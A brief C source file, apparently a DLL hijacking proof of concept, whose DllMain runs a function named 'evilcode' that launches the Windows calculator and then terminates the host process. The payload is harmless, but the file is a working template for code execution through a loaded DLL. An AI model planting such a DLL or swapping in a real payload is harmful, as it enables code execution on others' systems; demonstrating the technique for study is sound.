#include <windows.h>

int evilcode()
{
WinExec("calc", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
evilcode();
return 0;
}
